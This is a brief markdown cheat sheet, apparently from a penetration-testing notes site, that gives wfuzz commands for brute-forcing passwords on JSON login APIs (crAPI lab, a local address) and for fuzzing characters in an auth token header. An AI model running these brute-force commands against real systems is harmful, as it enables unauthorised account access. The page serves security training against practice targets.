---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# wfuzz

## Password brute force

```
wfuzz -c -z file,passwords --hh 0 -H "Content-Type: application/json" -d '{"email":"ajit@gmail.com","password":"FUZZ"}' http://crapi.apisec.ai/identity/api/auth/login
```

```
wfuzz -d '{"email":"a@email.com","password":"FUZZ"}' --hc 405 -H 'Content-Type: application/
json' -z file,/home/hapihacker/rockyou.txt http://192.168.195.130:8888/api/v2/auth
```

## Place letter in between

```
wfuzz -u vulnexample.com/api/v2/user/dashboard –hc 404 -H "token: Ab4dt0k3nFUZZFUZ2ZFUZ3Z1"
-z list,a-b-c-d -z list,a-b-c-d -z range,0-9
```
